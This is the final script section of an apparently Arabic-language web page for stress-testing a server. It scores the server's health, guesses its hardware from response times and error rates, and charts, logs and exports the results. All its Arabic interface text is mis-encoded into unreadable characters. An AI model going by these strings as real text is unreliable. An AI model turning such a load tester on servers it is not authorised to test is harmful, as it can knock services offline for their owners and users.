                        <li>Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù…ÙˆØ§Ø²Ù† Ø­Ù…Ù„ Ø£Ùˆ CDN</li>
                        <li>ØªÙˆÙ‚Ù Ø¹Ù† Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© ØªØ­Øª Ø¶ØºØ· Ù…Ù†Ø®ÙØ¶</li>
                    </ul>
                `;
            } else if (errorRate > 10 || avgResponseTime > 2000) {
                healthStatus = 'Ù…ØªÙˆØ³Ø·';
                healthIcon = 'âš ï¸';
                healthClass = 'warning';
                specs = `
                    <ul>
                        <li>ÙŠØ­ØªÙ…Ù„ Ø£Ù† ÙŠÙƒÙˆÙ† Ø³ÙŠØ±ÙØ± Ù…ØªÙˆØ³Ø· Ø§Ù„Ù…ÙˆØ§ØµÙØ§Øª (2-4 CoresØŒ 4-8GB RAM)</li>
                        <li>Ù‚Ø¯ ÙŠØ­ØªØ§Ø¬ Ø¥Ù„Ù‰ ØªØ­Ø³ÙŠÙ†Ø§Øª ÙÙŠ Ø§Ù„ØªÙƒÙˆÙŠÙ†</li>
                        <li>Ø£Ø¸Ù‡Ø± ØªØ¨Ø§Ø·Ø¤Ù‹Ø§ ØªØ­Øª Ø§Ù„Ø¶ØºØ·</li>
                    </ul>
                `;
            } else {
                healthStatus = 'Ù‚ÙˆÙŠ';
                healthIcon = 'âœ…';
                healthClass = 'success';
                specs = `
                    <ul>
                        <li>ÙŠØ­ØªÙ…Ù„ Ø£Ù† ÙŠÙƒÙˆÙ† Ø³ÙŠØ±ÙØ± Ù‚ÙˆÙŠ Ø§Ù„Ù…ÙˆØ§ØµÙØ§Øª (8+ CoresØŒ 16+GB RAM)</li>
                        <li>ÙŠØ³ØªØ®Ø¯Ù… Ù…ÙˆØ§Ø²Ù† Ø­Ù…Ù„ Ùˆ/Ø£Ùˆ CDN</li>
                        <li>ØªØ­Ù…Ù„ Ø§Ù„Ø¶ØºØ· Ø¨ÙƒÙØ§Ø¡Ø© Ø¹Ø§Ù„ÙŠØ©</li>
                    </ul>
                `;
            }
            
            elements.healthText.innerHTML = `
                <strong>Ø§Ù„Ø­Ø§Ù„Ø©:</strong> ${healthIcon} ${healthStatus}<br>
                <strong>Ù…ØªÙˆØ³Ø· Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø©:</strong> ${avgResponseTime.toFixed(2)}ms<br>
                <strong>Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø®Ø·Ø£:</strong> ${errorRate.toFixed(2)}%<br>
                <strong>Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø·Ù„Ø¨Ø§Øª:</strong> ${requestsPerSec.toFixed(2)}/Ø«Ø§Ù†ÙŠØ©
            `;
            
            if (final) {
                elements.serverSpecs.innerHTML = specs;
            }
            
            // ØªØ­Ø¯ÙŠØ« Ù„ÙˆÙ† Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„ØµØ­Ø©
            elements.serverHealth.style.borderLeftColor = `var(--${healthClass})`;
            elements.serverHealth.querySelector('.health-icon').textContent = healthIcon;
        }

        // ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
        function logMessage(message, type = 'info') {
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            
            const time = document.createElement('span');
            time.className = 'log-time';
            time.textContent = new Date().toLocaleTimeString();
            
            const msg = document.createElement('span');
            msg.className = `log-message ${type}`;
            msg.textContent = message;
            
            logEntry.appendChild(time);
            logEntry.appendChild(msg);
            elements.log.appendChild(logEntry);
            elements.log.scrollTop = elements.log.scrollHeight;
        }

        // ØªØ­Ø¯ÙŠØ« Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ‚Ø¯Ù…
        function updateProgress() {
            if (!state.isTesting) return;
            
            const elapsed = (Date.now() - state.startTime) / 1000;
            const progress = (elapsed / state.testDuration) * 100;
            
            if (progress <= 100) {
                elements.progress.style.width = `${progress}%`;
                elements.progressText.textContent = `${Math.min(Math.round(progress), 100)}%`;
                setTimeout(updateProgress, 100);
            }
        }

        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø­Ø§Ù„Ø©
        function resetState() {
            state.isTesting = false;
            state.successCount = 0;
            state.failedCount = 0;
            state.totalTime = 0;
            state.requestCount = 0;
            state.startTime = 0;
            state.responseTimes = [];
            
            clearInterval(state.testInterval);
            clearTimeout(state.durationTimeout);
            state.workers.forEach(worker => clearInterval(worker));
            state.workers = [];
            
            elements.success.textContent = '0';
            elements.failed.textContent = '0';
            elements.total.textContent = '0';
            elements.avgTime.textContent = '0ms';
            elements.maxTime.textContent = 'Ø§Ù„Ø£Ø¹Ù„Ù‰: 0ms';
            elements.successRate.textContent = '0%';
            elements.errorRate.textContent = '0%';
            elements.requestsRate.textContent = '0/Ø«Ø§Ù†ÙŠØ©';
            elements.progress.style.width = '0%';
            elements.progressText.textContent = '0%';
            
            elements.healthText.textContent = 'Ø³ÙŠØ¸Ù‡Ø± Ø§Ù„ØªÙ‚ÙŠÙŠÙ… Ø¨Ø¹Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±...';
            elements.serverSpecs.innerHTML = '';
            elements.serverHealth.style.borderLeftColor = 'var(--warning)';
            
            elements.powerText.textContent = 'Ø³ÙŠØ¸Ù‡Ø± Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø¨Ø¹Ø¯ Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±...';
            elements.powerCalculations.innerHTML = '';
        }

        // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ø±Ø³Ù… Ø§Ù„Ø¨ÙŠØ§Ù†ÙŠ
        function initChart() {
            if (state.chart) {
                state.chart.destroy();
            }
            
            const ctx = elements.chartCanvas.getContext('2d');
            state.chart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'ÙˆÙ‚Øª Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© (ms)',
                        data: [],
                        borderColor: 'rgba(231, 76, 60, 1)',
                        backgroundColor: 'rgba(231, 76, 60, 0.1)',
                        borderWidth: 2,
                        tension: 0.1,
                        fill: true
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true,
                            title: {
                                display: true,
                                text: 'Ø§Ù„ÙˆÙ‚Øª (ms)'
                            },
                            grid: {
                                color: 'rgba(255, 255, 255, 0.1)'
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.7)'
                            }
                        },
                        x: {
                            title: {
                                display: true,
                                text: 'Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨',
                                color: 'rgba(255, 255, 255, 0.7)'
                            },
                            grid: {
                                color: 'rgba(255, 255, 255, 0.1)'
                            },
                            ticks: {
                                color: 'rgba(255, 255, 255, 0.7)'
                            }
                        }
                    },
                    plugins: {
                        legend: {
                            labels: {
                                color: 'rgba(255, 255, 255, 0.7)'
                            }
                        },
                        tooltip: {
                            backgroundColor: 'rgba(0, 0, 0, 0.8)',
                            titleColor: 'rgba(255, 255, 255, 0.9)',
                            bodyColor: 'rgba(255, 255, 255, 0.9)',
                            borderColor: 'rgba(255, 255, 255, 0.2)',
                            borderWidth: 1
                        }
                    }
                }
            });
        }

        // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø±Ø³Ù… Ø§Ù„Ø¨ÙŠØ§Ù†ÙŠ
        function updateChart(responseTime) {
            if (!state.chart) return;

            const chart = state.chart;
            chart.data.labels.push(state.requestCount);
            chart.data.datasets[0].data.push(responseTime);

            if (chart.data.labels.length > 50) {
                chart.data.labels.shift();
                chart.data.datasets[0].data.shift();
            }

            chart.update();
        }

        // Ø­ÙØ¸ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
        function saveResults() {
            const results = {
                successCount: state.successCount,
                failedCount: state.failedCount,
                totalRequests: state.requestCount,
                avgResponseTime: (state.totalTime / state.successCount).toFixed(2),
                maxResponseTime: Math.max(...state.responseTimes).toFixed(2),
                startTime: new Date(state.startTime).toLocaleString(),
                endTime: new Date().toLocaleString()
            };

            const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'stress_test_results.json';
            a.click();
            URL.revokeObjectURL(url);

            logMessage('ğŸ’¾ ØªÙ… Ø­ÙØ¸ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø¨Ù†Ø¬Ø§Ø­!', 'success');
        }

        // ØªØµØ¯ÙŠØ± Ø§Ù„Ø³Ø¬Ù„
        function exportLog() {
            const logEntries = Array.from(elements.log.children).map(entry => {
                const time = entry.querySelector('.log-time').textContent;
                const message = entry.querySelector('.log-message').textContent;
                return `[${time}] ${message}`;
            });

            const blob = new Blob([logEntries.join('\n')], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'stress_test_log.txt';
            a.click();
            URL.revokeObjectURL(url);

            logMessage('ğŸ“„ ØªÙ… ØªØµØ¯ÙŠØ± Ø§Ù„Ø³Ø¬Ù„ Ø¨Ù†Ø¬Ø§Ø­!', 'success');
        }

        // Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„
        function clearLog() {
            elements.log.innerHTML = '';
            logMessage('ğŸ§¹ ØªÙ… Ù…Ø³Ø­ Ø§Ù„Ø³Ø¬Ù„.', 'info');
        }
    </script>
</body>
</html>